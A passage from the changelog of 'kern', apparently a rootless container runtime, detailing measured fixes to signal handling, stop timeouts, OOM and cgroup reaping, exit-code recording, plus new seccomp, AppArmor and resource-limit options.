  signal that reaches a waiting kern no longer costs the box its verdict; and the scope is asked for
  `OOMPolicy=continue` where the manager accepts it - PROBED once per boot, never version-gated,
  because an older manager rejects the property outright and would fail the `systemd-run` the box
  depends on. MEASURED after: **137 on all three boards, foreground and detached, exit record present**,
  with the cap read back at exactly `--memory` and no leaked scope, unit or process. `--memory` is now
  the WORKLOAD's ceiling on that path - kern's own ~1.3 MB no longer comes out of your budget - and the
  cost is ~2 ms of box start on the scope path only (x86's direct path measured unchanged at
  ~2.6 ms/box). Two things deliberately NOT done, both measured: `Delegate=yes` on the scope, which
  would be the textbook way to own that subtree and took a Jetson from 8 ms to **846 ms** per scope
  (kern does not need it - a user manager already creates the directory as the user), and a blanket
  `OOMPolicy=continue`, which on systemd 249 fails scope creation and would have started the box
  **uncapped**.
- **A signal aimed at a foreground `kern box` is aimed at the box.** kern used to die on a SIGTERM and
  leave the box to the PDEATHSIG cascade; it now forwards the signal, keeps waiting, and exits with the
  WORKLOAD's code - `docker run`'s contract, and what makes the exit code above survive a manager that
  stops the unit underneath it. A workload that ignores the first signal cannot make kern unkillable:
  the second exits immediately with `128+signo`, and `kern stop --stop-timeout 0` / SIGKILL remain the
  hard escapes. Behind a supervisor (a detached box) the signal is deliberately NOT relayed inwards -
  the box is already signalled directly, and relaying it was measured to record 143 for an OOM-killed
  box, kern's own SIGTERM beating the kernel's `oom.group` SIGKILL to the workload.
- **A service's `stop_grace_period` is its own upper bound again, not the longest one in the file.**
  `stop` shared ONE deadline across the stack, set to the longest grace configured anywhere in it,
  and floored the remainder at a second - so a service that asked for 1 s could be held far longer.
  MEASURED on a two-service stack, one asking 4 s and one asking 1 s, both hanging in their handler:
  the 1 s service was SIGKILLed at 5154 ms and the stop took 5010 ms. Each box's grace is now counted
  from the phase-1 signal against ITS OWN timeout: the same stack kills it at 1154 ms and finishes in
  4008 ms, which is max(grace) - the convergence the shared deadline existed for, without overriding
  what each service asked for. The bound stays one-sided by design: a member is never killed BEFORE
  its own grace, and can be killed later if a longer-grace member is torn down first, because the
  loop is sequential - and `stop` now waits on the SHORTEST grace first, which makes that loop
  optimal: each member waits only the difference from the one before it. MEASURED on a four-service
  stack asking 1, 2, 4 and 6 s, all hanging in their handler: before, the 1 s service was killed at
  6201 ms and the 4 s one at 6201; after, they die at 1195, 2196, 4200 and 6196, each on its own
  second, with the stack still finishing in 6008 ms. Reordering the waits reorders no shutdown -
  phase 1 signals every box at once - only which confirmation kern waits for first. Found by an
  external stress run of a mixed compose stack, in its own numbers: a service measured at 2005 ms
  alone took 3010 ms inside the stack.
- **Four lines of help and docs that no longer matched the code.** Found by re-reading the text
  against measured behaviour rather than against itself. `kern wait`'s help still said "Wait for
  RUNNING box(es)" after it learned to answer for one that already exited. `prune`'s said it removes
  "logs/health" while it also drops the exit record `wait` and `ps -a` read - which is the very thing
  that makes `wait` fail right after a `prune`, and that failure then blamed the one-hour window:
  measured, the box had exited two seconds earlier. And docs/DOCKER-COMPAT.md claimed `kill` "skips
  the wait": MEASURED at 3019 ms against `stop`'s 3013 on the same three-second grace, so it is a
  plain alias and a script that wants Docker's immediate kill wants `--stop-timeout 0`. That last one
  was written in this same release and was wrong when written.
- **`--stop-timeout`'s help says when the grace is skipped.** The flag read "Seconds the workload
  gets to exit on its own before the SIGKILL (default 10)", which promises a wait kern deliberately
  does not take when the box's init has no handler for the signal: a namespace PID 1 DISCARDS a
  signal it has no handler for, so the workload cannot die of it and the grace is a guaranteed wait
  for an event that can never happen (Docker and Podman sit it out anyway, measured at 10 278 and
  10 287 ms against kern's 21.9). The behaviour is unchanged and was already in BENCHMARKS.md and
  docs/DOCKER-COMPAT.md; what was missing is the one line a surprised reader looks at first. An
  external audit read `trap "" TERM` stopping in 4 ms as a defect, comparing it against the 3009 ms
  this project had published for `trap "sleep 60" TERM` - a handler that CATCHES the signal and never
  returns, which does spend the whole grace. Both numbers were right; the flag's own help did not say
  so. The two shapes are now an end-to-end test each, side by side, rather than prose.
- **An orphaned box is recoverable on the systemd-scope path too**, not only on the direct one. kern
  reaps a box whose supervisor was killed by remembering that box's own cgroup, and the path is
  recorded only when it names a `kern-box-*` dir - deliberately, because on the scope path a box's
  cgroup can be a scope kern did NOT create (`kern doctor` suggests `systemd-run --user --scope bash`
  to pay the scope cost once, and every box in that shell shares the shell's scope, so recording it
  would let a later reap `cgroup.kill` the user's whole session). The transient scope kern asks
  systemd for is now NAMED `kern-box-<pid>.scope`, which settles ownership by construction: an
  ambient scope is `run-*` and stays unrecorded. MEASURED on an Arduino UNO Q (aarch64, rootless,
  user systemd) before: SIGKILL a box's supervisor and the box vanished from `kern ps` while four of
  its processes kept running, with `kern stop` answering "no running box". After: `kern ps` shows it
  `orphaned`, `kern stop` reports "reaped via cgroup.kill", and no process is left. The recorded
  cgroup also lets the reaper hold engage there, so that board's exit codes went from 7 correct out
  of 10 under a bulk stop to 30 out of 30. The `.scope` suffix keeps the start-time orphan sweep off
  the dir (it reads the last `-` field as a pid, which never parses), and `stop` no longer rmdirs a
  cgroup that is a systemd unit - `--collect` removes it with the unit.
- **`kern wait` answers for a box that has already exited**, from the same exit record `kern ps -a`
  reads, for as long as `ps -a` still lists it (an hour). It used to refuse - "kern keeps no stopped
  boxes" - which was an inconsistency in kern's own surface rather than ephemerality: `ps -a` listed
  that box WITH its code while `wait` declined to print the same number, so a script that stopped a
  service could not ask how it had exited. Docker answers immediately there too. A box that is still
  running is unaffected: `wait` blocks until it exits, as before. Outside the window, and for an
  interactive `-it` box that never had a supervisor to record a code, `wait` still fails and says
  which case it is.
- **`--stop-timeout` is honoured in full, not rounded down to whole seconds.** `stop` waits the time
  LEFT until a deadline shared by the whole stack, and that remainder was truncated to seconds, so a
  box asked for 3 s got 2. Measured: a workload that flushes for 2.5 s under `--stop-timeout 3` was
  SIGKILLed at 2019 ms and recorded 137, where Docker's `stop -t 3` let the same workload finish in
  2799 ms and exit 5. kern now finishes it in 2526 ms with exit 5. A workload that exits at once
  still returns in ~16 ms, and one whose handler never finishes now consumes the whole 3 s rather
  than two thirds of it.
- **`kern stop` records the workload's own exit code, not a blanket 137.** A service that traps the
  stop signal and shuts down cleanly was reported as `exited (137)` - killed - by `kern ps -a` and
  `kern wait`, because the 137 was written when a stop was always a SIGKILL and the graceful phase
  arrived later without it following. Now the init's real status is read from its unreaped zombie and
  recorded, and 137 is kept for the case where it is the truth: an init that ignores the signal and is
  SIGKILLed. Measured against Docker on the same four-service stack (nginx, redis, and two shells that
  trap and exit 0 and 3): both runtimes now report 0, 0, 0 and 3, where kern previously reported 137
  four times. Reading that status is a race against whoever reaps the init - correct in 15 runs out of
  20 on its own - so `stop` holds the box's own reaper with SIGSTOP for the microseconds it takes,
  which makes it 30 out of 30. The hold is taken before any signal goes out (the group signal would
  otherwise kill the reaper first), released by a `Drop` on every path, and only ever applied to a
  process the box owns - never the user's systemd manager, which inherits an orphaned init, and never
  a FOREGROUND box's own process, which would print `Stopped` in the user's terminal. It is also
  taken only for a box with a dedicated cgroup, the case where a `stop` killed mid-hold is
  recoverable: `kern ps` then shows the box ORPHANED and the next `kern stop` reaps its cgroup whole.
  A box without one keeps the unguarded read rather than risking a stopped runner nothing can clear.
  On such a host the recorded code is therefore BEST-EFFORT: measured at 1 run in 12 recording 137 for
  a workload that exited 7, against 12 in 12 where a cgroup exists. It is not a timing window a caller
  can wait out - the same 12 runs had the workload's handler installed for 800 ms before the stop. Cost measured:
  none. A single stop is 16.20 ms against a 16.23 ms baseline and `stop --all` of 50 boxes is 110 ms
  against 119 ms, because consolidating the `/proc` readers onto one `stat_field` (reading `stat`
  rather than the much more expensive `status`) paid for the two extra signals.
- `kern gc` reaps orphaned box cgroups wherever a box was created, not only under kern.slice. A box
  that the OOM killer or a SIGKILL takes down leaves its `kern-box-*` cgroup dir behind (the RAII Drop
  that removes it cannot run on SIGKILL), and gc looked in one place while `apply_limits` creates in
  two: kern.slice on the direct path, the CALLER'S own cgroup on every other path. Measured on WSL2 as
  uid 0, where no kern.slice exists and boxes land at the cgroup root: three OOM-killed boxes left
  three dirs, a later box start did not reap them, and gc reported "nothing to prune" with them in
  place. After the fix the same sequence reports "reaped 3 orphaned box cgroups" and leaves none, while
  a live box's cgroup is untouched.
- kern no longer calls a box uncapped when the kernel is capping it. The uncapped notice and the
  `--require-limits` refusal keyed off "kern wrote no cap of its own", which is not the same question:
  on the systemd-scope path the scope carries `MemoryMax`/`TasksMax` and the backstops bind without
  kern writing a byte. Measured on a Raspberry Pi 5 over ssh, the box ran with `memory.max` 67108864,
  `memory.oom.group` 1 and `pids.max` 512 and was OOM-killed as a whole three times out of three
  (`dmesg`: `Memory cgroup out of memory`, three processes at once), while kern printed the notice and
  `--require-limits` refused to start. Both now ask the kernel what is in force: a memory ceiling that
  bounds the request anywhere up the tree, and a task ceiling at the box's own level (an ancestor's
  `pids.max` is shared with the session, so it does not count). The direct-path refusal is deliberately
  unchanged, since there the box's own cgroup is the sole enforcer by design. Verified both ways: on
  the Pi the notice is gone, `--require-limits` starts, and a 300 MB write is still killed 137; on a
  host with no delegation the notice and the refusal both still fire.
- A detached box's captured log is size-capped (two-file 32 MiB ring, zero-copy `splice`), so a
  runaway writer can't fill the session tmpfs.
- An OOM kills the whole box (`memory.oom.group = 1`), not one process.
- `kern ps`/`gc` under fd exhaustion no longer prunes or mis-reaps a live box (three-state liveness).
- A SIGKILL'd/OOM'd detached supervisor no longer leaves an unreachable "ghost": liveness reads
  `cgroup.events` `populated`; an orphan is visible (`--filter status=orphaned`) and reaped
  identity-safe against pid reuse.
- systemd detection probes the user manager's own control socket (`$XDG_RUNTIME_DIR/systemd/private`,
  what `systemd-run --user` actually connects to), so kern attempts the scope only where the manager is
  provably up: a dir-only host, or one with a reachable D-Bus bus but no user manager, no longer fails
  every box (it would connect and then die past kern's irreversible re-exec).
- A non-UTF-8 argument fails validation instead of panicking.
- The instance record is written atomically (temp + `rename`).
- `kern doctor` write-probes the real cap target; an unenforceable cap warns instead of running
  silently uncapped; `--pids-limit 1` is refused at parse; a second `vcpu:` profile warns.
- `volume ls --json` no longer lists names not on disk or misdirects a delete (display vs exact
  syscall form, `usable` flag); `kern <verb> --help` filters to the verb on a real terminal.
- `kern compose` anchors a service's relative `env_file`/`-v`/`rootfs` paths to the compose file's
  own directory, not the caller's working directory, so a stack runs the same from anywhere.
- Compose `restart: always`/`unless-stopped` is honoured on a pod member instead of being degraded to
  on-failure: kern's per-service supervisor keeps it up on ANY exit (including a clean 0) for the
  stack's lifetime. A standalone box's `always`/`unless-stopped` still takes the systemd path.
- A privileged port (`-p` below 1024) reports the real cause - a missing `CAP_NET_BIND_SERVICE`, or
  the address already in use - instead of a generic bind failure.
- A `--user`/image `USER` that cannot be mapped names the actual fix (install `newuidmap`/`newgidmap`
  + a `/etc/subuid`/`/etc/subgid` allocation, or use `--uid-range`) instead of blaming `--user`.
- A kern-TOML key (`health_cmd:`, `health_interval:`, `depends_healthy:`, `depends_completed:`, ...)
  written into a `docker-compose.yml` names the docker-compose equivalent (a `healthcheck:` block, or
  `depends_on: {SERVICE: {condition: service_healthy}}`) instead of a dead-end "unsupported", so a
  file that mixed the two spellings gets the fix rather than a silently missing health gate.
- The `kern-sandbox` SDKs decide `startup_failed` from an unforgeable channel: kern writes a "box
  started" byte to a caller-supplied `KERN_STARTED_FD` (CLOEXEC, so it never reaches the workload)
  only on the started path, so a workload can no longer forge the startup-failure marker on its own
  stderr to make the SDK raise. An older kern without the signal falls back to the stderr heuristic,
  which only ever over-reports a failure, never masks a real one.

### Added

- A CI gate fails, naming the syscall, when a new kernel `__NR_*` is neither allowed, denied, nor on
  the reviewed list (x86_64 + aarch64).
- `--require-limits` (or `KERN_REQUIRE_LIMITS`): refuse to start with a non-zero exit unless the
  memory and pids caps (including their defaults) are actually enforced, read back from the cgroup
  (the OOM / fork-bomb backstop), instead of running best-effort UNCAPPED. cpu/cpuset stay
  best-effort, as on the systemd-scope path (a QoS knob with no OOM/fork-bomb role). `--allow-uncapped`
  (`KERN_ALLOW_UNCAPPED`) is the explicit inverse: accept uncapped silently on a host with no cgroup
  delegation (nested CI). The two are mutually exclusive; the default is unchanged (warn once per
  host, run uncapped).
- `kern doctor` is more actionable: the multi-uid check names the commands to run (install the
  `newuidmap`/`newgidmap` helpers, then the `/etc/subuid`/`/etc/subgid` allocation line for your user,
  numeric-uid fallback when `$USER` is unset), not hardcoded to `apt`, and a new check reports whether
  `pasta` is present for pod/box outbound networking. kern uses these when present and never writes
  `/etc/subuid` or ships `pasta` itself.
- `--security-profile <untrusted>`: an opt-in bundle (seccomp allowlist + `--cap-drop ALL` +
  `--read-only`) for running code nobody has read, applied as a base that explicit flags and env
  override (`--cap-add X`, `KERN_SECCOMP=...`). `--cap-add ALL` and `--privileged` are refused under it
  (both would negate a constituent - all capabilities back, or a relaxed seccomp filter - leaving a box
  labelled untrusted that is not); a SET-but-unrecognised `KERN_SECCOMP` is a usage error, never a
  silent downgrade to the default filter. Closed set; prints its resolved constituents so the macro
  is visible. It does NOT touch Landlock (a write-allowlist needs
  the workload's real paths; build it from an audit run) and does NOT set `--require-limits` (which
  would break a cgroup-less host). The default is unchanged. It is a CLI/SDK flag; a compose service
  sets the same posture through its individual keys and `KERN_SECCOMP`, not a `[box.NAME]` macro key.
- The `kern-sandbox` SDKs (Python and Node) reach CLI parity for the above: `security_profile`
  /`securityProfile` maps to `--security-profile`, and `require_limits`/`requireLimits` to
  `--require-limits`. `security_profile="untrusted"` composes with the writable `-v` workspace (the
  root goes read-only, a bound mount stays writable). Note `require_limits` is the fail-closed gate,
  distinct from the pre-existing `enforce_limits` (which only picks the scope vs best-effort cap path)
  and mutually exclusive with the `KERN_ALLOW_UNCAPPED` env the SDK forwards.
- `kern ps -a`/`--all` lists recently-exited boxes (from their `waitexit` breadcrumbs), and
  `kern wait` resolves a box that has already exited, not only a live one.
- `--user` (and compose `user:`) accepts a NAME, resolved against the image's own
  `/etc/passwd`/`/etc/group`; the image's declared `USER` is honoured the same way. It fails closed
  on a host without `newuidmap` rather than silently running as in-box root.
- A compose `shm_size:` is recognised and left intentionally cgroup-bounded: `/dev/shm` is charged to
  the box memory cgroup (`mem_limit` / `--memory`), not pinned to a fixed size, so there is no 64 MB
  `/dev/shm` footgun to size around.
- `--apparmor <profile>` (CLI + the `kern-sandbox` Python/Node SDKs): enter a pre-loaded AppArmor
  (LSM) profile on the box's exec, layered over namespaces + seccomp (Docker's `--security-opt
  apparmor=`). A missing or unloadable profile fails the box CLOSED; `kern exec` re-enters the box's
  recorded profile so an exec is no less confined than the workload; a box whose posture predates this
  recording is refused rather than exec'd unconfined. kern applies no default profile.
- The Linux release build produces a size-optimized binary with a pinned-nightly `build-std` +
  `-Cpanic=immediate-abort` (~22% smaller than a plain stable `--release`, which a from-source
  `cargo install` still yields), reproducible byte-for-byte with the pinned toolchain. The source
  stays 100% stable Rust, so `cargo test` runs on the same source a release would ship. The exact
  sizes and the panic-diagnostics tradeoff this buys are in [OPEN_ITEMS.md](OPEN_ITEMS.md).
